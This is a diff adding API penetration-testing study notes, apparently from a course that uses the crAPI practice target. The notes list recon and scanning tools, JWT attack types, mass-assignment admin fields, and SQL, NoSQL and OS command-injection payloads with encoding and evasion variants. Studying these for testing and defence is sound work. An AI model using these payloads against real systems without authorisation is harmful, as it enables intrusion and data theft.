@@ -1,0 +1,212 @@
+Reconnaissance:
+
+TruffleHog
+The Wayback Machine
+Nmap
+OWASP Amass
+Gobuster --> Directory Brute-force
+Kiterunner
+DevTools
+
+
+Endpoint Analysis:
+
+Reverse Engineering
+Postman
+mitmweb
+mitmproxy2swagger
+
+Check Excessive Data Exposure
+
+
+Scanning:
+
+Nikto
+nikto -h http://crapi.apisec.ai
+
+OWASP ZAP
+Import the target's API specification file
+
+
+Authentication:
+
+Brute-forcing and Password Spraying
+Token Analysis
+
+JWT Attacks
+echo eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9|base64 -d
+The None Attack
+The Algorithm Switch Attack --> RS256 to HS256
+JWT Crack Attack
+
+JWT_Tool
+
+
+Authorization:
+
+Broken Object Level Authorization
+A-B testing
+
+Broken Function Level Authorization
+A-B-A testing
+
+
+Improper Assets Management:
+
+api.target.com/v3
+/api/v2/accounts
+/api/v3/accounts
+/v2/accounts
+
+Accept: version=2.0
+Accept api-version=3
+
+/api/accounts?ver=2
+
+POST /api/accounts
+{
+"ver":1.0,
+"user":"hapihacker"
+}
+
+Non-production versions
+api.test.target.com
+api.uat.target.com
+beta.api.com
+/api/private
+/api/partner
+/api/test
+
+
+Mass Assignment:
+
+Overwrite object properties that they should not be able to
+
+"isadmin": true,
+"isadmin":"true",
+"admin": 1,
+"admin": true, 
+
+Burp --> Param Miner
+
+
+Server-Side Request Forgery:
+
+Application retrieves remote resources without validating user input
+
+In-Band SSRF and Blind SSRF
+In Band SSRF, means that the server responds with the resources specified by the end user
+Blind SSRF takes place when the attacker supplies a URL and the server makes the request but does not send information from the specified URL back to the attacker
+
+Include full URLs in the POST body or parameters
+Include URL paths (or partial URLs) in the POST body or parameters
+Headers that include URLs like Referer
+Allows for user input that may result in a server retrieving resources
+
+Burp Collaborator
+Your own web server
+
+
+Injection:
+
+Send
+A very large number
+A very large string
+A negative number
+A string (instead of a number or Boolean value)
+Random characters
+Boolean values
+Meta characters
+
+SQL Metacharacters
+Characters that SQL treats as functions rather than data
+- is a metacharacter that tells the SQL interpreter to ignore the following input because it is a comment
+
+SQL metacharacters
+'
+''
+;%00 --> A null byte
+--
+-- -
+""
+;
+' OR '1
+' OR 1 -- -
+" OR "" = "
+" OR 1 = 1 -- -
+' OR '' = '
+OR 1=1
+
+NoSQL metacharacters
+$gt 
+{"$gt":""}
+{"$gt":-1}
+$ne
+{"$ne":""}
+{"$ne":-1}
+ $nin
+{"$nin":1}
+{"$nin":[1]}
+{"$where":  "sleep(1000)"}
+
+OS Injection
+|
+||
+&
+&&
+'
+"
+;
+'"
+
+Common Operating System Commands to Use in Injection Attacks
+ipconfig
+dir
+ver
+whoami
+ifconfig
+ls
+pwd
+
+Tools
+Postman Collection Runner
+Burp Intruder
+WFuzz
+
+
+Evasive Maneuvers:
+
+String Terminators
+%00
+0x00
+//
+;
+%
+!
+?
+[]
+%5B%5D
+%09
+%0a
+%0b
+%0c
+%0e
+
+POST /api/v1/user/profile/update
+[…]
+{
+“uname”: “hapihacker”
+“pass”: "%00'OR 1=1"
+}
+
+Case Switching
+Example
+POST /api/myProfile 
+POST /api/MyProfile 
+POST /aPi/MypRoFiLe
+
+Encoding Payloads
+Double URL Encoded Payload
+' OR 1=1;
+%27%20%4f%52%20%31%3d%31%3b
+%25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
